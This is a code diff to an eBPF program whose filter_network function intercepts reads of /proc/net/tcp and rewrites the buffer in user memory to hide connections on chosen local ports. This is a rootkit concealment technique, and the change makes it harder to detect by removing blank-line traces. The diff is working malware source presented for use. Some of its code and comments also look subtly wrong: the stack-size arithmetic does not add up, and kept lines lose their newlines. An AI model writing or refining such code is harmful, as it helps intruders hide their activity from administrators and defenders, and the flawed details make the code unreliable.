@@ -100,15 +100,24 @@ int filter_network(struct sys_exit_read_args *ctx)
         return 0;
 
     /*
-     * Filter lines from the read buffer that contain the target port hex.
+     * Filter lines from the read buffer that contain the target port hex
+     * in the *local* address field only.
      * /proc/net/tcp format:
      *   sl  local_address rem_address   st tx_queue rx_queue ...
      *    0: 0100007F:1BB4 00000000:0000 0A ...
      *
-     * We look for the hex port string in each line and zero it out if found.
-     * The buffer is text-based so we scan for newlines and check each line.
+     * We count colons per line and match only at colon #2 (the local port)
+     * to avoid spuriously hiding connections whose *remote* endpoint happens
+     * to use a target port.
+     *
+     * Approach: two-pass.  First pass marks lines to hide in a small bitmap
+     * and records line boundaries.  Second pass compacts the buffer by
+     * copying non-hidden lines up, eliminating the blank-line artefacts
+     * that the previous space-fill approach left behind.
      */
     int total = (int)ctx->ret;
+    if (total > 4096)
+        total = 4096;
     char *buf = (char *)(unsigned long)(*buf_ptr);
 
     /* Build hex strings for each port to hide. */
@@ -122,9 +131,22 @@ int filter_network(struct sys_exit_read_args *ctx)
             port_hex[i][0] = '\0';
     }
 
-    /* Scan buffer line by line. */
+    /*
+     * Pass 1 — scan buffer line by line, identify lines to hide.
+     *
+     * We record line boundaries in two parallel arrays and a bitmap.
+     * MAX_LINES is kept small (64) to satisfy the eBPF verifier's
+     * stack-size limit (512 bytes).  64 lines × (2 × 2 bytes + 1 bit)
+     * comfortably fits while still covering a typical /proc/net/tcp read.
+     */
+    const int MAX_LINES = 64;
+    int line_starts[MAX_LINES];
+    int line_ends[MAX_LINES];
+    char line_hide[MAX_LINES]; /* 1 = hide, 0 = keep */
+    int num_lines = 0;
+
     int line_start = 0;
-    for (int pos = 0; pos < total && pos < 4096; pos++) {
+    for (int pos = 0; pos < total; pos++) {
         char c = 0;
         if (bpf_probe_read_user(&c, 1, buf + pos) < 0)
             break;
@@ -134,23 +156,45 @@ int filter_network(struct sys_exit_read_args *ctx)
 
         int line_end = (c == '\n') ? pos : pos + 1;
 
-        /* Check this line for any target port. */
-        for (int pi = 0; pi < MAX_PORTS; pi++) {
-            if (port_hex[pi][0] == '\0')
-                continue;
+        if (num_lines >= MAX_LINES)
+            goto pass2;
 
-            /* Scan the line for the port hex preceded by ':'. */
-            for (int j = line_start; j < line_end - 3; j++) {
-                char ch = 0;
-                if (bpf_probe_read_user(&ch, 1, buf + j) < 0)
+        /* Count colons to locate the local_address field.
+         *
+         * /proc/net/tcp line format:
+         *   sl  local_address rem_address   st ...
+         *    0: 0100007F:1BB4 00000000:0000 0A ...
+         *    ^1        ^2            ^3
+         */
+        int colon_count = 0;
+        int local_port_colon = -1;
+        for (int j = line_start; j < line_end; j++) {
+            char ch = 0;
+            if (bpf_probe_read_user(&ch, 1, buf + j) < 0)
+                break;
+            if (ch == ':') {
+                colon_count++;
+                if (colon_count == 2) {
+                    local_port_colon = j;
                     break;
-                if (ch != ':')
+                }
+            }
+        }
+
+        line_starts[num_lines] = line_start;
+        line_ends[num_lines] = line_end;
+        line_hide[num_lines] = 0;
+
+        if (local_port_colon >= 0) {
+            /* Check this line for any target port at the local_port_colon. */
+            for (int pi = 0; pi < MAX_PORTS; pi++) {
+                if (port_hex[pi][0] == '\0')
                     continue;
 
                 int match = 1;
                 for (int k = 0; k < 4; k++) {
                     char hc = 0;
-                    if (bpf_probe_read_user(&hc, 1, buf + j + 1 + k) < 0) {
+                    if (bpf_probe_read_user(&hc, 1, buf + local_port_colon + 1 + k) < 0) {
                         match = 0;
                         break;
                     }
@@ -160,17 +204,49 @@ int filter_network(struct sys_exit_read_args *ctx)
                     }
                 }
                 if (match) {
-                    /* Zero out the line to hide it. */
-                    for (int z = line_start; z < line_end; z++) {
-                        char space = ' ';
-                        bpf_probe_write_user(buf + z, 1, &space);
-                    }
+                    line_hide[num_lines] = 1;
                     break;
                 }
             }
         }
 
+        num_lines++;
         line_start = line_end + 1;
+    }
+
+pass2:
+    /*
+     * Pass 2 — compact: copy kept lines to their final positions.
+     *
+     * write_pos tracks the next byte to write in the compacted buffer.
+     * For each kept line, copy its bytes forward.  Finally, zero-fill
+     * the tail so the caller sees a shorter buffer.
+     */
+    {
+        int write_pos = 0;
+        for (int li = 0; li < num_lines; li++) {
+            if (line_hide[li])
+                continue;
+
+            int ls = line_starts[li];
+            int le = line_ends[li];
+            int len = le - ls;
+
+            /* Copy line bytes one at a time (eBPF constraint). */
+            for (int off = 0; off < len; off++) {
+                char byte = 0;
+                if (bpf_probe_read_user(&byte, 1, buf + ls + off) < 0)
+                    break;
+                bpf_probe_write_user(buf + write_pos + off, 1, &byte);
+            }
+            write_pos += len;
+        }
+
+        /* Zero-fill the tail so the reader sees truncated content. */
+        for (int z = write_pos; z < total; z++) {
+            char nul = '\0';
+            bpf_probe_write_user(buf + z, 1, &nul);
+        }
     }
 
     return 0;
